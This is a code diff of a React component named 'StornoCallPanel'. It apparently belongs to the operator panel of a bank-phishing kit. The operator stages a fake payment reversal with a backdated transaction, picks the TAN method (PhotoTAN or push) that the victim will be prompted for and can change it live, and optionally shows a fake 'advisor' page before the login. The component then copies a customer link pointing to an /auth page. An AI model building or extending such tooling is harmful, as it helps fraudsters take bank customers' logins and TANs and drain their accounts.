@@ -1,13 +1,16 @@
-import { useEffect, useState } from "react";
+import { useState } from "react";
 import { supabase } from "@/integrations/supabase/client";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Button } from "@/components/ui/button";
 import { Textarea } from "@/components/ui/textarea";
-import { RefreshCw } from "lucide-react";
+import { RefreshCw, Link2 } from "lucide-react";
 import { toast } from "sonner";
 import { generateToken, defaultPastDateTime, formatBetragInput, parseBetrag, numberToGermanWords } from "./tokenHelpers";
+import StornoLiveCard from "./StornoLiveCard";
+
+type Method = "photo" | "push";
 
 const StornoCallPanel = ({ hideActiveList = false }: { hideActiveList?: boolean }) => {
   const [auftraggeberName, setAuftraggeberName] = useState("");
@@ -17,7 +20,10 @@ const StornoCallPanel = ({ hideActiveList = false }: { hideActiveList?: boolean 
   const [betrag, setBetrag] = useState("");
   const [verwendungszweck, setVerwendungszweck] = useState("");
   const [executedAt, setExecutedAt] = useState(defaultPastDateTime());
+  const [tanMethod, setTanMethod] = useState<Method>("push");
+  const [showBerater, setShowBerater] = useState(false);
   const [creating, setCreating] = useState(false);
+  const [lastLink, setLastLink] = useState<string | null>(null);
 
   const resetForm = () => {
     setAuftraggeberName(""); setAuftraggeberIban("");
@@ -42,12 +48,22 @@ const StornoCallPanel = ({ hideActiveList = false }: { hideActiveList?: boolean 
       betrag: parseBetrag(betrag),
       verwendungszweck: verwendungszweck || null,
       executed_at: executedAt ? new Date(executedAt).toISOString() : null,
+      tan_method: tanMethod,
+      show_berater: showBerater,
+      customer_phase: showBerater ? "berater" : "login",
     });
     setCreating(false);
     if (error) { toast.error("Fehler beim Anlegen: " + error.message); return; }
-    try { await navigator.clipboard.writeText(token); } catch {}
-    toast.success(`Storno-Token erstellt: ${token}`, { description: "Token in Zwischenablage kopiert" });
+    const url = `${window.location.origin}/auth`;
+    setLastLink(url);
+    try { await navigator.clipboard.writeText(url); toast.success(`Kunden-Link kopiert: ${token}`); }
+    catch { toast.success(`Storno-Token erstellt: ${token}`); }
     resetForm();
+  };
+
+  const copyLink = async () => {
+    if (!lastLink) return;
+    try { await navigator.clipboard.writeText(lastLink); toast.success("Link kopiert"); } catch {}
   };
 
   return (
@@ -106,11 +122,46 @@ const StornoCallPanel = ({ hideActiveList = false }: { hideActiveList?: boolean 
             </div>
           </section>
 
-          <Button onClick={handleCreate} disabled={creating} className="gap-2">
-            <RefreshCw className="h-4 w-4" />Token generieren
-          </Button>
+          <section className="space-y-2 pt-2 border-t">
+            <h3 className="text-sm font-semibold">4. TAN-Verfahren (Vorgabe)</h3>
+            <div className="flex flex-wrap gap-2">
+              {(["photo", "push"] as const).map(m => (
+                <Button key={m} size="sm" type="button"
+                  variant={tanMethod === m ? "default" : "outline"}
+                  onClick={() => setTanMethod(m)}>
+                  {m === "photo" ? "PhotoTAN" : "Standard"}
+                </Button>
+              ))}
+            </div>
+            <p className="text-xs text-muted-foreground">Kann später live in der Steuerung geändert werden.</p>
+          </section>
+
+          <section className="space-y-2">
+            <label className="flex items-center gap-2 text-sm cursor-pointer select-none">
+              <input type="checkbox" checked={showBerater} onChange={e => setShowBerater(e.target.checked)}
+                className="h-4 w-4 rounded border-input accent-primary" />
+              <span className="font-medium">Berater-Seite anzeigen</span>
+              <span className="text-xs text-muted-foreground">(wird nach Token-Eingabe vor dem Login angezeigt)</span>
+            </label>
+          </section>
+
+          <div className="flex flex-wrap items-center gap-2">
+            <Button onClick={handleCreate} disabled={creating} className="gap-2">
+              <RefreshCw className="h-4 w-4" />Session erstellen &amp; Link kopieren
+            </Button>
+            {lastLink && (
+              <Button variant="outline" onClick={copyLink} className="gap-2">
+                <Link2 className="h-4 w-4" />Letzten Link kopieren
+              </Button>
+            )}
+          </div>
+          {lastLink && (
+            <div className="text-xs text-muted-foreground font-mono break-all">{lastLink}</div>
+          )}
         </CardContent>
       </Card>
+
+      <StornoLiveCard />
     </div>
   );
 };
